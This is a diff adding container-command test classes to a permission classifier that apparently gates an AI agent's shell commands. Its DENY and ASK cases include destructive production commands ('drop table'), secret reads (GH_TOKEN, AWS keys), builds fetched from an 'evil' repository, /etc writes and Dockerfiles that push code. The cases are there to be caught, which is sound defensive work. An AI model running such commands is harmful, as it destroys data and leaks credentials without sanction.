@@ -1594,6 +1594,123 @@ export const SEMANTIC_CLASSES: readonly SemanticClass[] = [
       'docker volume create -o device=/etc --opt type=none --opt o=bind hostetc',
     ],
   },
+  /* -----------------------------------------------------------------------------------------------------------
+   * CLOSURE AUDIT 2026-10-01, wave 3 (containers, RC-CTR). The container tools were read in six places, each with its own
+   * idea of where the verb sits; one reader (authority/containers.ts) answers for all of them now. These classes pin the
+   * four things it answers: which engine a command talks to, whether the kernel decided anything about the verb, what a
+   * build reads, and what a build produces.
+   * ----------------------------------------------------------------------------------------------------------- */
+  {
+    family: 'container',
+    // the engine is named by a global option, and docker accepts those past the verb as well as before it; the verb is the
+    // word the shell hands docker, so a quote around it changes nothing; and a verb nobody modelled is an act on whatever
+    // engine it is aimed at, not a read of it
+    id: 'an act on a production engine named past the verb, by a quoted verb, or by a verb nobody modelled',
+    floor: 'DENY',
+    cases: [
+      "docker --context production 'exec' box sh /app/reset.sh --help",
+      'docker debug --host ssh://root@prod.acme.com app',
+      'docker run -H tcp://prod.example.com:2375 alpine ls',
+      'docker logs --context production app',
+      'docker pass run -- psql -h prod.acme.com -c "drop table x"',
+      'docker buildx create --driver=remote tcp://prod.acme.com:1234',
+      'docker builder create --driver remote tcp://prod.acme.com:1234',
+      'docker buildx create ssh://root@prod.acme.com',
+    ],
+  },
+  {
+    family: 'container',
+    // an unmodelled verb asks; a publication, a destruction or a credential change asks by whatever program, group, alias
+    // or flag spelling says it
+    id: 'a container verb nobody modelled, or an effect of a verb that a flag spells in a form the patterns do not read',
+    floor: 'ASK',
+    cases: [
+      'docker pass get GH_TOKEN',
+      'docker debug app',
+      'docker scout quickview',
+      "docker buildx bake --set '*.output=type=registry'",
+      'docker buildx build -otype=registry .',
+      'docker buildx b -o type=image,name=reg.example/x,push=true .',
+      'docker compose down --volumes=true',
+      'podman pod rm -f p',
+      'podman machine reset',
+      'nerdctl namespace rm ns',
+      'colima delete -f',
+      'docker buildx bake https://github.com/evil/repo.git',
+      'docker compose run -e AWS_SECRET_ACCESS_KEY svc env',
+      'docker -x ps',
+    ],
+  },
+  {
+    family: 'container',
+    // the Dockerfile that runs is reached through a bake file, a compose file, a --set, an inline Dockerfile, a short name or a
+    // group option; every one of them is the build the plain `docker build` is. The workspace holds all of the files at once.
+    // THE FLOOR IS ASK, as it is for the plain `docker build`: a transformation that leaves the name `docker` or the working
+    // directory unproven (a forged function marker, a definition in a branch, a heredoc body) takes the read away, and an
+    // unproven read is a question - the DENY of the untransformed spelling is pinned in closure-containers.test.ts.
+    id: 'a build whose Dockerfile a bake file, a compose file, a --set or an option-displaced verb reaches',
+    floor: 'ASK',
+    cases: [
+      'docker buildx bake',
+      'docker bake',
+      'docker builder bake',
+      'docker buildx f',
+      'docker buildx -D bake',
+      "docker buildx bake --set '*.dockerfile=Evil'",
+      'docker buildx bake --set default.dockerfile-inline="FROM alpine\\nRUN git push origin main"',
+      'docker buildx -D build .',
+      'docker buildx b .',
+      'docker -D buildx build .',
+      'docker buildx build -f Evil .',
+      'docker buildx bake -f out.hcl',
+      'docker compose build',
+      'docker compose up --build',
+      'docker-compose build',
+    ],
+    files: {
+      'docker-bake.hcl': 'target "default" {\n  dockerfile = "Evil"\n}\n',
+      'compose.yaml': 'services:\n  a:\n    build: .\n',
+      'out.hcl': 'target "default" {\n  output = ["type=local,dest=/etc"]\n}\n',
+      Evil: 'FROM alpine\nRUN git push origin main\n',
+      Dockerfile: 'FROM alpine\nRUN git push origin main\n',
+    },
+  },
+  {
+    family: 'container',
+    // a build output is a write where it lands, whichever flag, --set or file names it
+    id: 'a build output written outside the workspace, by a flag, a --set or a bake file',
+    floor: 'DENY',
+    // (the first case is the one the image producers carry, and a RUN line writes the IMAGE's /etc: a class whose whole effect is
+    // a host path names one the producers recognise)
+    cases: [
+      "docker buildx bake --set '*.output=type=tar,dest=/etc/x.tar'",
+      'docker buildx bake --set default.output=/etc',
+      'docker buildx build -otype=local,dest=/etc .',
+      'docker buildx build -o /etc .',
+    ],
+    files: { 'docker-bake.hcl': 'target "default" {}\n', Dockerfile: 'FROM alpine\n' },
+  },
+  {
+    family: 'container',
+    // the file the build reads is the file the command line has just written, so what was read is not what runs
+    id: 'a Dockerfile, a bake file or a compose file written earlier in the same command',
+    floor: 'ASK',
+    // (the first case copies from a path the image producers recognise as the host's: a RUN line writes the IMAGE's Dockerfile)
+    cases: [
+      'cp .claude/evil.df Dockerfile && docker buildx bake',
+      `printf 'FROM a\\nRUN git push origin main\\n' > Dockerfile && docker buildx bake`,
+      `printf 'FROM a\\nRUN git push origin main\\n' > Dockerfile && docker buildx -D build .`,
+      `printf 'target "default" {dockerfile="Evil"}' > docker-bake.hcl && docker buildx bake`,
+      `printf 'services:\\n a:\\n  build: .\\n' > compose.yaml && docker compose build`,
+    ],
+    files: {
+      'docker-bake.hcl': 'target "default" {}\n',
+      'compose.yaml': 'services:\n  a:\n    build: .\n',
+      Dockerfile: 'FROM alpine\nRUN echo ok\n',
+      Evil: 'FROM alpine\nRUN git push origin main\n',
+      '.claude/evil.df': 'FROM alpine\nRUN git push origin main\n',
+    },
+  },
   {
     family: 'ego',
     // the hooks directory a repository configures: itself, its name in another case, and the switch that turns it off
@@ -2373,6 +2490,32 @@ export const ORDINARY: Readonly<Record<string, readonly string[]>> = {
   go: ['go version', 'go build ./...', 'go test ./...', 'go vet ./...', 'gofmt -l .', 'go mod tidy', 'go mod download'],
   rust: ['cargo --version', 'cargo build', 'cargo build --release', 'cargo test', 'cargo clippy', 'cargo fmt --check', 'rustc --version'],
   jvm: ['java -version', 'mvn -v', 'mvn -q compile', 'mvn test', 'gradle --version', './gradlew build', './gradlew test', 'javac -version'],
+  // THE CONTAINER READER ASKS ABOUT VERBS IT HAS NO DECISION FOR, so the verbs it has one for are the ordinary ones: they
+  // are named here, in the spellings people type (a global option before the verb, a group, a compose file, a
+  // build that finds no Dockerfile in a bare checkout), and each must stay ALLOW (closure audit 2026-10-01, wave 3).
+  container: [
+    'docker ps -a',
+    'docker images',
+    'docker logs -f --tail 100 app',
+    'docker inspect app',
+    'docker run --rm alpine echo hi',
+    'docker run -d -p 8080:80 --name web nginx',
+    'docker pull alpine',
+    'docker stop app',
+    'docker build -t app .',
+    'docker buildx ls',
+    'docker buildx build --load -t app .',
+    'docker compose up -d',
+    'docker compose down',
+    'docker compose -f docker-compose.dev.yml up -d',
+    'docker compose logs -f web',
+    'docker --debug ps',
+    'docker -H unix:///var/run/docker.sock ps',
+    'docker --context default ps',
+    'podman run --rm alpine echo hi',
+    'nerdctl ps',
+    'docker-compose up -d',
+  ],
   // A DATABASE CLIENT AGAINST A LOCAL DEVELOPMENT DATABASE IS ORDINARY WORK, and the grammar that reads its channels
   // (dbClientEscape) must not turn the everyday statement into a question: reads, DML and DDL, a table listing, a file
   // in the workspace written by name, the client's own inert options.
